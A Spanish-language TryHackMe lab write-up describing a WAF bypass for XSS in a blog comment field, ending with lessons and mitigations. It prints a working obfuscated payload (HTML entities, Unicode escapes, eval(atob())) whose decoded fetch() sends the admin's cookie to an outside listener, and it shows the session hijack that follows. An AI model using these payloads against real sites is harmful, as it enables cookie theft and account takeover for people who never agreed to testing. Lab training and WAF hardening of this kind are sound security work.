---
title: "XSS Blog Unicode Base64 Bypass"
platform: "TryHackMe"
os: "Windows"
difficulty: "Hard"
ip: "10.82.144.73"
slug: "xss-blog-unicode-base64-bypass"
author: "Z4k7"
date: "2026-03-29"
year: "2026"
status: "pwned"
tags:
  - "XSS"
  - "Bypass"
  - "Unicode"
  - "Base64"
  - "WAF"
  - "Blog"
  - "redteam"
  - "xXX"
  - "x0D"
techniques:
  - "XSS"
  - "WAF"
  - "Unicode Encoding"
  - "Base64 Encoding"
  - "HTML Entity Encoding"
tools:
  - "Burp Suite"
  - "Curl"
  - "Python"
flags_list:
  - label: "user"
    value: "hash_aqui"
  - label: "root"
    value: "hash_aqui"
summary: "Aplicación web de blog vulnerable a XSS Reflejado protegida por WAF ModSecurity CRS v3.3.5. El WAF bloquea payloads directos de XSS. Bypass exitoso usando combinación de Unicode escapes, HTML entities y Base64 encoding. Objetivo: capturar cookie del administrador a través de inyección en comentarios que visualiza el admin, resultando en acceso a cuenta administrativa.  ---"
steps:

  - id: "recon_1"
    num: "01"
    title: "Reconocimiento"
    content:
      - kind: "note"
        text: |
          La aplicación es un blog con sistema de comentarios. Campo de entrada vulnerable a XSS en sección de comentarios.
          Intentamos payloads estándar de XSS:
      - kind: "code"
        lang: "BASH"
        code: |
          <script>alert("xss")</script>
          <img src=x onerror=alert("xss")>
      - kind: "note"
        text: |
          Resultado: Status 403 — WAF bloqueando
      - kind: "image"
        src: "assets/images/WAF%20Exploitation%20Techniques/file-20260328195058294.jpg"
        caption: "Evidencia técnica"
      - kind: "image"
        src: "assets/images/WAF%20Exploitation%20Techniques/file-20260328195111647.jpg"
        caption: "Evidencia técnica"
      - kind: "callout"
        type: "tip"
        label: "Agente"
        text: "Cuando un payload simple es bloqueado, no significa que XSS sea imposible. Significa que necesitas cambiar la representación del payload. El WAF busca palabras clave en texto plano: nunca decodifica Unicode, HTML entities o Base64 antes de hacer matching."

  - id: "enum_1"
    num: "02"
    title: "Enumeración"
    content:
      - kind: "note"
        text: |
          El WAF está configurado con política OWASP CRS v3.3.5. Detecta palabras clave en texto plano:
          `<script>`
          `onerror=`
          `onclick=`
          `fetch`
          `document.cookie`
          Sin embargo, no decodifica:
      - kind: "bullet"
        text: "Unicode escapes (uXXXX)"
      - kind: "bullet"
        text: "HTML entities (&#xXX;)"
      - kind: "bullet"
        text: "Base64"
      - kind: "note"
        text: |
          Esta es la brecha: WAF analiza una representación, pero el navegador ejecuta otra.
      - kind: "callout"
        type: "info"
        label: "Cadena de parsing diferente"
        text: "WAF ve: `&#x0D;vascript` (no contiene `javascript:`) Navegador decodifica: `&#x0D;` → carriage return ignorado → resultado: `javascript:`"
      - kind: "image"
        src: "assets/images/WAF%20Exploitation%20Techniques/file-20260328195123925.jpg"
        caption: "Evidencia técnica"
      - kind: "callout"
        type: "tip"
        label: "Agente"
        text: "Esta es la esencia de todos los bypasses WAF: discrepancia de parsing. El WAF y el navegador procesan el input de forma diferente. Tu trabajo es encontrar esa diferencia."

  - id: "step3"
    num: "03"
    title: "Paso 1: Construir Payload Base64"
    content:
      - kind: "note"
        text: |
          Comando que queremos ejecutar en el navegador del admin:
      - kind: "code"
        lang: "JAVASCRIPT"
        code: |
          fetch('http://10.81.82.134:9000/'+encodeURIComponent(document.cookie))
      - kind: "note"
        text: |
          Convertir a Base64:
      - kind: "code"
        lang: "BASH"
        code: |
          echo -n "fetch('http://10.81.82.134:9000/'+encodeURIComponent(document.cookie))" | base64
          ZmV0Y2goJ2h0dHA6Ly8xMC44MS44Mi4xMzQ6OTAwMC8nK2VuY29kZVVSSUNvbXBvbmVudChkb2N1bWVudC5jb29raWUpKQ==

  - id: "step4_1"
    num: "04"
    title: "Paso 2: Ofuscación con Unicode + HTML Entities"
    content:
      - kind: "note"
        text: |
          Payload completamente ofuscado combinando 3 técnicas:
      - kind: "code"
        lang: "HTML"
        code: |
          <a href=ja&#x0D;vascript&colon:\u0065val(\u0061tob("ZmV0Y2goJ2h0dHA6Ly8xMC44MS44Mi4xMzQ6OTAwMC8nK2VuY29kZVVSSUNvbXBvbmVudChkb2N1bWVudC5jb29raWUpKQ=="))>Click Me</a>
      - kind: "note"
        text: |
          Desglose:
      - kind: "bullet"
        text: "ja&#x0D; → ja + carriage return (HTML entity ignorada visualmente) + vascript → navegador reconstruye: javascript:"
      - kind: "bullet"
        text: "&colon; → HTML entity para :"
      - kind: "bullet"
        text: "\u0065val → Unicode escape para eval"
      - kind: "bullet"
        text: "\u0061tob → Unicode escape para atob"
      - kind: "bullet"
        text: "Base64 en string → eval(atob(...)) decodifica en runtime"
      - kind: "note"
        text: |
          Resultado: Status 200 ✅ — WAF permite
      - kind: "image"
        src: "assets/images/WAF%20Exploitation%20Techniques/file-20260328195140064.jpg"
        caption: "Evidencia técnica"
      - kind: "callout"
        type: "tip"
        label: "Agente"
        text: "La combinación de técnicas es clave. El WAF podría detectar cada una por separado, pero juntas crean complejidad. Es como un cifrado: cada capas de ofuscación requiere una capa de decodificación."

  - id: "exploit_1"
    num: "05"
    title: "Acceso Inicial"
    content:
      - kind: "note"
        text: |
          El administrador revisa constantemente comentarios nuevos. Cuando visualiza nuestro payload ofuscado:
          1. Navegador decodifica HTML entities (`&#x0D;`, `&colon;`)
          2. Navegador decodifica Unicode escapes (`\u0065`, `\u0061`)
          3. JavaScript ejecuta `eval(atob(...))`
          4. `atob()` decodifica Base64 → `fetch(...)`
          5. `fetch()` envía cookie admin a nuestro servidor en puerto 9000
          Server escuchando en puerto 9000 captura:
      - kind: "code"
        lang: "BASH"
        code: |
          GET /?PHPSESSID=admin_session_token HTTP/1.1
      - kind: "note"
        text: |
          Cookie del admin obtenida. Inyectamos en navegador:
      - kind: "code"
        lang: "JAVASCRIPT"
        code: |
          document.cookie = "PHPSESSID=admin_session_token"
      - kind: "note"
        text: |
          Refrescamos página → acceso como administrador confirmado.
      - kind: "image"
        src: "assets/images/WAF%20Exploitation%20Techniques/file-20260328195123925.jpg"
        caption: "Evidencia técnica"
      - kind: "callout"
        type: "tip"
        label: "Agente"
        text: "Nota que el flag no está explícitamente aquí porque este lab es sobre técnica de bypass, no sobre obtener flag. En engagements reales, una vez tienes acceso admin, continúas lateralmente."

lessons:
  - 'Discrepancia de parsing: WAF analiza texto plano, navegador decodifica múltiples capas'
  - 'Unicode escapes (`\uXXXX`) se decodifican en runtime JavaScript, WAF no las entiende'
  - 'HTML entities (`&#x...;`) se decodifican en HTML parsing antes de JavaScript'
  - 'Base64 aparece como string inofensivo al WAF pero `eval(atob(...))` lo ejecuta'
  - 'HttpOnly flag ausente permitió acceso directo a cookie vía XSS'
  - 'Combinación de técnicas es exponencialmente más efectiva que una sola'
mitigation:
  - 'Establecer `HttpOnly` y `Secure` flags en TODAS las cookies administrativas'
  - 'WAF debe decodificar Unicode, HTML entities, Base64 ANTES de buscar patrones peligrosos'
  - 'Content Security Policy (CSP): `script-src ''self''` bloquea eval() directamente'
  - 'Sanitización server-side con librerías dedicadas (DOMPurify, no blacklists)'
  - 'Validación en servidor: rechazar `eval`, `atob`, `document.cookie` en comentarios'
---
